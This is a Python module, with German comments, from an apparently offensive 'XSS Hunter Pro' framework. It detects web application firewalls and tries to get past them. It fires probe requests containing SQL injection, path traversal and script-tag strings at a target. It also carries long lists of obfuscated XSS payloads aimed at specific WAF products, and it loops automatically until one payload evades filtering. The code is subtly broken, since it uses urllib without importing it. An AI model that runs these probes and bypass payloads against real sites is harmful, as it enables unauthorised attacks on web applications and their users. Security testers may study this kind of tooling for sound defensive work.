#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS Hunter Pro Framework - WAF Scanner und Bypass Module
=======================================================

Dieses Modul enthält Funktionen zum Erkennen und Umgehen von Web Application Firewalls (WAFs).

Autor: Anonymous
Lizenz: MIT
Version: 0.3.0
"""

import os
import sys
import re
import json
import logging
import requests
import random
import time
from typing import Dict, List, Optional, Any, Tuple, Union, Set

# Füge das Hauptverzeichnis zum Pfad hinzu, um Module zu importieren
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    import utils
except ImportError:
    logger = logging.getLogger("XSSHunterPro.WAFScanner")
    logger.warning("Utils-Modul konnte nicht importiert werden. Verwende einfache Implementierungen.")
    
    class SimpleUtils:
        @staticmethod
        def load_json_file(file_path):
            try:
                if not os.path.exists(file_path):
                    print(f"Datei nicht gefunden: {file_path}")
                    return None
                
                with open(file_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception as e:
                print(f"Fehler beim Laden der JSON-Datei {file_path}: {e}")
                return None
    
    utils = SimpleUtils()

# Konfiguriere Logging
logger = logging.getLogger("XSSHunterPro.WAFScanner")

class WAFScanner:
    """
    Klasse zum Erkennen von Web Application Firewalls (WAFs).
    """
    
    def __init__(self, config=None):
        """
        Initialisiert den WAF-Scanner.
        
        Args:
            config: Die Konfiguration für den Scanner.
        """
        self.config = config or {}
        self.waf_signatures_file = self.config.get("waf_signatures_file", os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "data", "waf_signatures.json"))
        self.waf_signatures = self._load_waf_signatures()
        self.user_agent = self.config.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
        self.timeout = self.config.get("timeout", 10)
        self.max_retries = self.config.get("max_retries", 3)
        self.delay = self.config.get("delay", 1)
        
    def _load_waf_signatures(self):
        """
        Lädt die WAF-Signaturen aus der Konfigurationsdatei.
        
        Returns:
            Die WAF-Signaturen.
        """
        # Standardsignaturen, falls die Datei nicht geladen werden kann
        default_signatures = {
            "Cloudflare": {
                "headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
                "body": ["cloudflare", "ray id:", "cf-browser-verification"],
                "status_codes": [403, 503],
                "cookies": ["__cfduid", "cf_clearance"]
            },
            "ModSecurity": {
                "headers": [],
                "body": ["mod_security", "not acceptable", "forbidden"],
                "status_codes": [403, 406, 501],
                "cookies": []
            },
            "Incapsula": {
                "headers": ["x-iinfo", "x-cdn"],
                "body": ["incapsula", "incap_ses", "_incapsula_resource"],
                "status_codes": [403, 502, 504],
                "cookies": ["incap_ses", "visid_incap"]
            },
            "Akamai": {
                "headers": ["x-akamai-transformed", "akamai-origin-hop"],
                "body": ["akamai", "reference"],
                "status_codes": [403, 400],
                "cookies": ["ak_bmsc", "bm_sz"]
            },
            "F5 BIG-IP": {
                "headers": ["x-cnection", "x-wa-info"],
                "body": ["big-ip", "the requested url was rejected"],
                "status_codes": [403, 501],
                "cookies": ["BIGipServer", "F5_ST", "TS"]
            },
            "Sucuri": {
                "headers": ["x-sucuri-id", "x-sucuri-cache"],
                "body": ["sucuri", "cloudproxy", "access denied - sucuri website firewall"],
                "status_codes": [403],
                "cookies": ["sucuri_cloudproxy_uuid"]
            },
            "Imperva": {
                "headers": ["x-iinfo", "x-cdn"],
                "body": ["imperva", "incapsula", "blocked by imperva"],
                "status_codes": [403, 500],
                "cookies": ["visid_incap", "incap_ses"]
            },
            "Barracuda": {
                "headers": [],
                "body": ["barracuda", "barracuda networks", "you have been blocked"],
                "status_codes": [403, 500],
                "cookies": []
            },
            "Citrix": {
                "headers": ["via", "ns-cache"],
                "body": ["citrix", "netscaler", "access forbidden"],
                "status_codes": [403, 406],
                "cookies": ["citrix_ns_id"]
            },
            "AWS WAF": {
                "headers": ["x-amzn-requestid", "x-amz-cf-id", "x-amz-id-2"],
                "body": ["aws", "waf", "request blocked"],
                "status_codes": [403, 405],
                "cookies": []
            },
            "Wordfence": {
                "headers": [],
                "body": ["wordfence", "generated by wordfence", "site access is blocked"],
                "status_codes": [403, 503],
                "cookies": ["wfvt_", "wordfence_verifiedHuman"]
            },
            "Fortinet": {
                "headers": [],
                "body": ["fortinet", "fortigate", "fortigate firewall"],
                "status_codes": [400, 403, 405],
                "cookies": []
            },
            "Radware": {
                "headers": [],
                "body": ["radware", "unauthorized activity has been detected", "malicious bot activity detected"],
                "status_codes": [403, 400],
                "cookies": []
            },
            "DDoS-Guard": {
                "headers": ["x-ddos-guard"],
                "body": ["ddos-guard", "ddos guard", "blocked by ddos guard"],
                "status_codes": [403, 503],
                "cookies": []
            },
            "Distil": {
                "headers": ["x-distil-cs"],
                "body": ["distil", "distil networks", "are you a bot"],
                "status_codes": [403, 405],
                "cookies": ["dnt"]
            },
            "Reblaze": {
                "headers": [],
                "body": ["reblaze", "access denied (reblaze)", "security by reblaze"],
                "status_codes": [403, 503],
                "cookies": ["rbzid"]
            },
            "Varnish": {
                "headers": ["x-varnish", "via"],
                "body": ["varnish", "varnish cache server"],
                "status_codes": [403, 503],
                "cookies": []
            },
            "Wallarm": {
                "headers": [],
                "body": ["wallarm", "nginx-wallarm"],
                "status_codes": [403, 500],
                "cookies": []
            },
            "Edgecast": {
                "headers": ["server"],
                "body": ["edgecast", "global defender"],
                "status_codes": [400, 403, 404],
                "cookies": []
            },
            "Fastly": {
                "headers": ["fastly-debug-digest", "x-served-by", "x-cache"],
                "body": ["fastly", "fastly error"],
                "status_codes": [403, 503],
                "cookies": []
            }
        }
        
        # Versuche, die Signaturen aus der Datei zu laden
        if os.path.exists(self.waf_signatures_file):
            try:
                signatures = utils.load_json_file(self.waf_signatures_file)
                if signatures:
                    return signatures
            except Exception as e:
                logger.error(f"Fehler beim Laden der WAF-Signaturen: {e}")
        
        # Verwende Standardsignaturen, wenn die Datei nicht geladen werden kann
        return default_signatures
        
    def detect_waf(self, url, headers=None, cookies=None, proxies=None):
        """
        Erkennt, ob eine Webseite durch eine WAF geschützt ist.
        
        Args:
            url: Die URL der Webseite.
            headers: Zusätzliche HTTP-Header.
            cookies: Cookies für die Anfrage.
            proxies: Proxies für die Anfrage.
            
        Returns:
            Der Name der erkannten WAF oder None, wenn keine WAF erkannt wurde.
        """
        headers = headers or {}
        cookies = cookies or {}
        proxies = proxies or {}
        
        # Füge User-Agent hinzu, wenn nicht vorhanden
        if "User-Agent" not in headers:
            headers["User-Agent"] = self.user_agent
            
        # Führe normale Anfrage durch
        try:
            response = self._make_request(url, headers, cookies, proxies)
            if not response:
                return None
                
            # Überprüfe auf WAF-Signaturen
            detected_waf = self._check_waf_signatures(response)
            if detected_waf:
                return detected_waf
                
            # Führe Testanfrage mit bekanntem Angriffsmuster durch
            test_url = self._add_attack_pattern(url)
            test_response = self._make_request(test_url, headers, cookies, proxies)
            if not test_response:
                return None
                
            # Überprüfe auf WAF-Signaturen in der Testanfrage
            detected_waf = self._check_waf_signatures(test_response)
            if detected_waf:
                return detected_waf
                
            # Überprüfe auf Statuscode-Änderungen
            if response.status_code != test_response.status_code and test_response.status_code in [400, 403, 405, 406, 501, 502, 503]:
                # Versuche, die WAF anhand der Antwort zu identifizieren
                for waf_name, signatures in self.waf_signatures.items():
                    if test_response.status_code in signatures.get("status_codes", []):
                        return waf_name
                
                # Wenn keine spezifische WAF erkannt wurde, aber der Statuscode sich geändert hat
                return "Unknown WAF"
                
            return None
            
        except Exception as e:
            logger.error(f"Fehler bei der WAF-Erkennung: {e}")
            return None
            
    def _make_request(self, url, headers, cookies, proxies):
        """
        Führt eine HTTP-Anfrage durch.
        
        Args:
            url: Die URL der Webseite.
            headers: HTTP-Header für die Anfrage.
            cookies: Cookies für die Anfrage.
            proxies: Proxies für die Anfrage.
            
        Returns:
            Die HTTP-Antwort oder None, wenn ein Fehler auftritt.
        """
        for attempt in range(self.max_retries):
            try:
                response = requests.get(
                    url,
                    headers=headers,
                    cookies=cookies,
                    proxies=proxies,
                    timeout=self.timeout,
                    allow_redirects=True,
                    verify=False
                )
                return response
            except requests.exceptions.RequestException as e:
                logger.warning(f"Fehler bei der Anfrage (Versuch {attempt+1}/{self.max_retries}): {e}")
                if attempt < self.max_retries - 1:
                    time.sleep(self.delay)
                    
        return None
        
    def _check_waf_signatures(self, response):
        """
        Überprüft eine HTTP-Antwort auf WAF-Signaturen.
        
        Args:
            response: Die HTTP-Antwort.
            
        Returns:
            Der Name der erkannten WAF oder None, wenn keine WAF erkannt wurde.
        """
        if not response:
            return None
            
        # Konvertiere Header und Body in Strings für einfachere Suche
        headers_str = str(response.headers).lower()
        body_str = response.text.lower() if hasattr(response, 'text') else ""
        cookies_str = str(response.cookies).lower() if hasattr(response, 'cookies') else ""
        
        # Überprüfe jede WAF-Signatur
        for waf_name, signatures in self.waf_signatures.items():
            # Überprüfe Header
            for header in signatures.get("headers", []):
                if header.lower() in headers_str:
                    logger.info(f"WAF erkannt (Header): {waf_name}")
                    return waf_name
                    
            # Überprüfe Body
            for pattern in signatures.get("body", []):
                if pattern.lower() in body_str:
                    logger.info(f"WAF erkannt (Body): {waf_name}")
                    return waf_name
                    
            # Überprüfe Cookies
            for cookie in signatures.get("cookies", []):
                if cookie.lower() in cookies_str:
                    logger.info(f"WAF erkannt (Cookie): {waf_name}")
                    return waf_name
                    
            # Überprüfe Statuscodes
            if response.status_code in signatures.get("status_codes", []):
                # Zusätzliche Überprüfung, da Statuscodes allein nicht eindeutig sind
                if any(header.lower() in headers_str for header in signatures.get("headers", [])) or \
                   any(pattern.lower() in body_str for pattern in signatures.get("body", [])) or \
                   any(cookie.lower() in cookies_str for cookie in signatures.get("cookies", [])):
                    logger.info(f"WAF erkannt (Statuscode + andere Signaturen): {waf_name}")
                    return waf_name
                    
        return None
        
    def _add_attack_pattern(self, url):
        """
        Fügt ein bekanntes Angriffsmuster zu einer URL hinzu.
        
        Args:
            url: Die URL.
            
        Returns:
            Die URL mit dem Angriffsmuster.
        """
        # Liste von bekannten Angriffsmustern, die WAFs auslösen
        attack_patterns = [
            "' OR 1=1 --",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "/?exec=/bin/bash",
            "/?eval=phpinfo()",
            "/?param=<script>alert(document.cookie)</script>",
            "/?param=../../etc/passwd",
            "/?param=1' OR '1'='1",
            "/?param=1 UNION SELECT 1,2,3,4,5--",
            "/?param=<img src=x onerror=alert(1)>"
        ]
        
        # Wähle ein zufälliges Angriffsmuster
        pattern = random.choice(attack_patterns)
        
        # Füge das Muster zur URL hinzu
        if "?" in url:
            return f"{url}&attack={pattern}"
        else:
            return f"{url}?attack={pattern}"

class WAFBypass:
    """
    Klasse zum Umgehen von Web Application Firewalls (WAFs).
    """
    
    def __init__(self, config=None):
        """
        Initialisiert den WAF-Bypass.
        
        Args:
            config: Die Konfiguration für den Bypass.
        """
        self.config = config or {}
        self.waf_bypass_file = self.config.get("waf_bypass_file", os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "data", "waf_bypass.json"))
        self.waf_bypass_payloads = self._load_waf_bypass_payloads()
        
    def _load_waf_bypass_payloads(self):
        """
        Lädt die WAF-Bypass-Payloads aus der Konfigurationsdatei.
        
        Returns:
            Die WAF-Bypass-Payloads.
        """
        # Standardpayloads, falls die Datei nicht geladen werden kann
        default_payloads = {
            "Cloudflare": {
                "html": [
                    "<img src=x onerror=prompt(1);>",
                    "<svg/onload=prompt(1)>",
                    "<svg onload=prompt&#40;1&#41;>",
                    "<svg/onload=prompt&#40;1&#41;>",
                    "<svg onload=prompt&#x28;1&#x29;>",
                    "<svg/onload=prompt&#x28;1&#x29;>",
                    "<svg onload=prompt%26%2340%3B1%26%2341%3B>",
                    "<svg/onload=prompt%26%2340%3B1%26%2341%3B>",
                    "<svg onload=prompt%26%23x28%3B1%26%23x29%3B>",
                    "<svg/onload=prompt%26%23x28%3B1%26%23x29%3B>"
                ],
                "js": [
                    "prompt(1)",
                    "prompt\\u0028document.domain\\u0029",
                    "prompt\\x28document.domain\\x29",
                    "eval('pro'+'mpt(1)')",
                    "window['pro'+'mpt'](1)",
                    "this['pro'+'mpt'](1)",
                    "pro\\u006dpt(1)",
                    "pro\\x6dpt(1)",
                    "window.pro\\u006dpt(1)",
                    "window.pro\\x6dpt(1)"
                ],
                "attr": [
                    "\" onmouseover=\"prompt(1)\" \"",
                    "\" onmouseover=prompt(1) \"",
                    "\" onmouseover=prompt`1` \"",
                    "\" onmouseover=prompt&#40;1&#41; \"",
                    "\" onmouseover=prompt&#x28;1&#x29; \"",
                    "\" onmouseover=prompt%26%2340%3B1%26%2341%3B \"",
                    "\" onmouseover=prompt%26%23x28%3B1%26%23x29%3B \"",
                    "\" onmouseover=pro\\u006dpt(1) \"",
                    "\" onmouseover=pro\\x6dpt(1) \"",
                    "\" onmouseover=eval('pro'+'mpt(1)') \""
                ]
            },
            "ModSecurity": {
                "html": [
                    "<img src=x onerror=prompt(1)>",
                    "<img src=x onerror=prompt`1`>",
                    "<img src=x onerror=window['pro'+'mpt'](1)>",
                    "<img src=x onerror=eval('pro'+'mpt(1)')>",
                    "<img src=x onerror=this['pro'+'mpt'](1)>",
                    "<img src=x onerror=pro\\u006dpt(1)>",
                    "<img src=x onerror=pro\\x6dpt(1)>",
                    "<img src=x onerror=window.pro\\u006dpt(1)>",
                    "<img src=x onerror=window.pro\\x6dpt(1)>",
                    "<img src=x onerror=eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))>"
                ],
                "js": [
                    "prompt(1)",
                    "prompt`1`",
                    "window['pro'+'mpt'](1)",
                    "eval('pro'+'mpt(1)')",
                    "this['pro'+'mpt'](1)",
                    "pro\\u006dpt(1)",
                    "pro\\x6dpt(1)",
                    "window.pro\\u006dpt(1)",
                    "window.pro\\x6dpt(1)",
                    "eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))"
                ],
                "attr": [
                    "\" onmouseover=\"prompt(1)\" \"",
                    "\" onmouseover=prompt(1) \"",
                    "\" onmouseover=prompt`1` \"",
                    "\" onmouseover=window['pro'+'mpt'](1) \"",
                    "\" onmouseover=eval('pro'+'mpt(1)') \"",
                    "\" onmouseover=this['pro'+'mpt'](1) \"",
                    "\" onmouseover=pro\\u006dpt(1) \"",
                    "\" onmouseover=pro\\x6dpt(1) \"",
                    "\" onmouseover=window.pro\\u006dpt(1) \"",
                    "\" onmouseover=window.pro\\x6dpt(1) \""
                ]
            },
            "Incapsula": {
                "html": [
                    "<img src=x onerror=prompt(1)>",
                    "<img src=x onerror=prompt`1`>",
                    "<img src=x onerror=window['pro'+'mpt'](1)>",
                    "<img src=x onerror=eval('pro'+'mpt(1)')>",
                    "<img src=x onerror=this['pro'+'mpt'](1)>",
                    "<img src=x onerror=pro\\u006dpt(1)>",
                    "<img src=x onerror=pro\\x6dpt(1)>",
                    "<img src=x onerror=window.pro\\u006dpt(1)>",
                    "<img src=x onerror=window.pro\\x6dpt(1)>",
                    "<img src=x onerror=eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))>"
                ],
                "js": [
                    "prompt(1)",
                    "prompt`1`",
                    "window['pro'+'mpt'](1)",
                    "eval('pro'+'mpt(1)')",
                    "this['pro'+'mpt'](1)",
                    "pro\\u006dpt(1)",
                    "pro\\x6dpt(1)",
                    "window.pro\\u006dpt(1)",
                    "window.pro\\x6dpt(1)",
                    "eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))"
                ],
                "attr": [
                    "\" onmouseover=\"prompt(1)\" \"",
                    "\" onmouseover=prompt(1) \"",
                    "\" onmouseover=prompt`1` \"",
                    "\" onmouseover=window['pro'+'mpt'](1) \"",
                    "\" onmouseover=eval('pro'+'mpt(1)') \"",
                    "\" onmouseover=this['pro'+'mpt'](1) \"",
                    "\" onmouseover=pro\\u006dpt(1) \"",
                    "\" onmouseover=pro\\x6dpt(1) \"",
                    "\" onmouseover=window.pro\\u006dpt(1) \"",
                    "\" onmouseover=window.pro\\x6dpt(1) \""
                ]
            },
            "Akamai": {
                "html": [
                    "<img src=x onerror=prompt(1)>",
                    "<img src=x onerror=prompt`1`>",
                    "<img src=x onerror=window['pro'+'mpt'](1)>",
                    "<img src=x onerror=eval('pro'+'mpt(1)')>",
                    "<img src=x onerror=this['pro'+'mpt'](1)>",
                    "<img src=x onerror=pro\\u006dpt(1)>",
                    "<img src=x onerror=pro\\x6dpt(1)>",
                    "<img src=x onerror=window.pro\\u006dpt(1)>",
                    "<img src=x onerror=window.pro\\x6dpt(1)>",
                    "<img src=x onerror=eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))>"
                ],
                "js": [
                    "prompt(1)",
                    "prompt`1`",
                    "window['pro'+'mpt'](1)",
                    "eval('pro'+'mpt(1)')",
                    "this['pro'+'mpt'](1)",
                    "pro\\u006dpt(1)",
                    "pro\\x6dpt(1)",
                    "window.pro\\u006dpt(1)",
                    "window.pro\\x6dpt(1)",
                    "eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))"
                ],
                "attr": [
                    "\" onmouseover=\"prompt(1)\" \"",
                    "\" onmouseover=prompt(1) \"",
                    "\" onmouseover=prompt`1` \"",
                    "\" onmouseover=window['pro'+'mpt'](1) \"",
                    "\" onmouseover=eval('pro'+'mpt(1)') \"",
                    "\" onmouseover=this['pro'+'mpt'](1) \"",
                    "\" onmouseover=pro\\u006dpt(1) \"",
                    "\" onmouseover=pro\\x6dpt(1) \"",
                    "\" onmouseover=window.pro\\u006dpt(1) \"",
                    "\" onmouseover=window.pro\\x6dpt(1) \""
                ]
            },
            "F5 BIG-IP": {
                "html": [
                    "<img src=x onerror=prompt(1)>",
                    "<img src=x onerror=prompt`1`>",
                    "<img src=x onerror=window['pro'+'mpt'](1)>",
                    "<img src=x onerror=eval('pro'+'mpt(1)')>",
                    "<img src=x onerror=this['pro'+'mpt'](1)>",
                    "<img src=x onerror=pro\\u006dpt(1)>",
                    "<img src=x onerror=pro\\x6dpt(1)>",
                    "<img src=x onerror=window.pro\\u006dpt(1)>",
                    "<img src=x onerror=window.pro\\x6dpt(1)>",
                    "<img src=x onerror=eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))>"
                ],
                "js": [
                    "prompt(1)",
                    "prompt`1`",
                    "window['pro'+'mpt'](1)",
                    "eval('pro'+'mpt(1)')",
                    "this['pro'+'mpt'](1)",
                    "pro\\u006dpt(1)",
                    "pro\\x6dpt(1)",
                    "window.pro\\u006dpt(1)",
                    "window.pro\\x6dpt(1)",
                    "eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))"
                ],
                "attr": [
                    "\" onmouseover=\"prompt(1)\" \"",
                    "\" onmouseover=prompt(1) \"",
                    "\" onmouseover=prompt`1` \"",
                    "\" onmouseover=window['pro'+'mpt'](1) \"",
                    "\" onmouseover=eval('pro'+'mpt(1)') \"",
                    "\" onmouseover=this['pro'+'mpt'](1) \"",
                    "\" onmouseover=pro\\u006dpt(1) \"",
                    "\" onmouseover=pro\\x6dpt(1) \"",
                    "\" onmouseover=window.pro\\u006dpt(1) \"",
                    "\" onmouseover=window.pro\\x6dpt(1) \""
                ]
            },
            "Default": {
                "html": [
                    "<img src=x onerror=prompt(1)>",
                    "<img src=x onerror=prompt`1`>",
                    "<svg/onload=prompt(1)>",
                    "<svg onload=prompt(1)>",
                    "<iframe srcdoc=\"<script>prompt(1)</script>\">",
                    "<details open ontoggle=prompt(1)>",
                    "<audio src=x onerror=prompt(1)>",
                    "<video src=x onerror=prompt(1)>",
                    "<body onload=prompt(1)>",
                    "<marquee onstart=prompt(1)>"
                ],
                "js": [
                    "prompt(1)",
                    "prompt`1`",
                    "window['pro'+'mpt'](1)",
                    "eval('pro'+'mpt(1)')",
                    "this['pro'+'mpt'](1)",
                    "pro\\u006dpt(1)",
                    "pro\\x6dpt(1)",
                    "window.pro\\u006dpt(1)",
                    "window.pro\\x6dpt(1)",
                    "eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))"
                ],
                "attr": [
                    "\" onmouseover=\"prompt(1)\" \"",
                    "\" onmouseover=prompt(1) \"",
                    "\" onmouseover=prompt`1` \"",
                    "\" onfocus=\"prompt(1)\" autofocus \"",
                    "\" onfocus=prompt(1) autofocus \"",
                    "\" onblur=\"prompt(1)\" autofocus \"",
                    "\" onblur=prompt(1) autofocus \"",
                    "\" onclick=\"prompt(1)\" \"",
                    "\" onclick=prompt(1) \"",
                    "\" ondblclick=\"prompt(1)\" \""
                ]
            }
        }
        
        # Versuche, die Payloads aus der Datei zu laden
        if os.path.exists(self.waf_bypass_file):
            try:
                payloads = utils.load_json_file(self.waf_bypass_file)
                if payloads:
                    return payloads
            except Exception as e:
                logger.error(f"Fehler beim Laden der WAF-Bypass-Payloads: {e}")
        
        # Verwende Standardpayloads, wenn die Datei nicht geladen werden kann
        return default_payloads
        
    def generate_payload(self, waf_type=None, context="html", marker="XSS"):
        """
        Generiert einen WAF-Bypass-Payload.
        
        Args:
            waf_type: Der Typ der WAF.
            context: Der Kontext des Payloads (html, js, attr).
            marker: Ein Marker, der in den Payload eingefügt wird.
            
        Returns:
            Der generierte Payload.
        """
        # Verwende "Default", wenn kein WAF-Typ angegeben ist oder der Typ nicht unterstützt wird
        if not waf_type or waf_type not in self.waf_bypass_payloads:
            waf_type = "Default"
            
        # Verwende "html", wenn der Kontext nicht unterstützt wird
        if context not in ["html", "js", "attr"]:
            context = "html"
            
        # Wähle einen zufälligen Payload aus
        payloads = self.waf_bypass_payloads.get(waf_type, {}).get(context, [])
        if not payloads:
            # Fallback auf Default-Payloads
            payloads = self.waf_bypass_payloads.get("Default", {}).get(context, [])
            
        if not payloads:
            # Fallback auf einfache Payloads
            if context == "html":
                return f"<img src=x onerror=alert('{marker}')>"
            elif context == "js":
                return f"alert('{marker}')"
            elif context == "attr":
                return f"\" onmouseover=\"alert('{marker}')\" \""
                
        # Wähle einen zufälligen Payload
        payload = random.choice(payloads)
        
        # Ersetze Platzhalter durch den Marker
        if "prompt(1)" in payload:
            payload = payload.replace("prompt(1)", f"alert('{marker}')")
        elif "prompt`1`" in payload:
            payload = payload.replace("prompt`1`", f"alert`{marker}`")
        
        return payload
        
    def test_payload(self, url, payload, headers=None, cookies=None, proxies=None):
        """
        Testet einen Payload gegen eine WAF.
        
        Args:
            url: Die URL der Webseite.
            payload: Der zu testende Payload.
            headers: Zusätzliche HTTP-Header.
            cookies: Cookies für die Anfrage.
            proxies: Proxies für die Anfrage.
            
        Returns:
            True, wenn der Payload die WAF umgehen konnte, sonst False.
        """
        headers = headers or {}
        cookies = cookies or {}
        proxies = proxies or {}
        
        # Füge User-Agent hinzu, wenn nicht vorhanden
        if "User-Agent" not in headers:
            headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            
        # Füge den Payload zur URL hinzu
        if "?" in url:
            test_url = f"{url}&param={urllib.parse.quote(payload)}"
        else:
            test_url = f"{url}?param={urllib.parse.quote(payload)}"
            
        try:
            # Führe Anfrage durch
            response = requests.get(
                test_url,
                headers=headers,
                cookies=cookies,
                proxies=proxies,
                timeout=10,
                allow_redirects=True,
                verify=False
            )
            
            # Überprüfe, ob der Payload blockiert wurde
            if response.status_code in [400, 403, 405, 406, 501, 502, 503]:
                return False
                
            # Überprüfe, ob der Payload in der Antwort enthalten ist
            if payload in response.text:
                return True
                
            # Überprüfe, ob der URL-kodierte Payload in der Antwort enthalten ist
            if urllib.parse.quote(payload) in response.text:
                return True
                
            return False
            
        except Exception as e:
            logger.error(f"Fehler beim Testen des Payloads: {e}")
            return False
            
    def find_working_payload(self, url, waf_type=None, context="html", marker="XSS", max_attempts=10, headers=None, cookies=None, proxies=None):
        """
        Findet einen funktionierenden WAF-Bypass-Payload.
        
        Args:
            url: Die URL der Webseite.
            waf_type: Der Typ der WAF.
            context: Der Kontext des Payloads (html, js, attr).
            marker: Ein Marker, der in den Payload eingefügt wird.
            max_attempts: Die maximale Anzahl von Versuchen.
            headers: Zusätzliche HTTP-Header.
            cookies: Cookies für die Anfrage.
            proxies: Proxies für die Anfrage.
            
        Returns:
            Der funktionierende Payload oder None, wenn kein Payload gefunden wurde.
        """
        for attempt in range(max_attempts):
            # Generiere einen Payload
            payload = self.generate_payload(waf_type, context, marker)
            
            # Teste den Payload
            if self.test_payload(url, payload, headers, cookies, proxies):
                return payload
                
        return None
